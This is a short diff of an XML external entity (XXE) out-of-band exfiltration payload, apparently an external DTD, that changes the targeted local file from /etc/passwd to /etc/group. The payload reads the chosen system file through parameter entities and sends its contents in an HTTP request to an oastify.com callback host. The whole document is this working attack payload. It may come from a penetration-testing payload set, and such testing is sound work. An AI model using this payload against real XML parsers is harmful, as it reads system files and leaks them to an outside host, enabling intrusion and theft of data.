@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///etc/group">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://akyljne63br5chpepcxbmzwvgmmca1.oastify.com/?x=%file;'>">
 %eval;
 %exfiltrate;
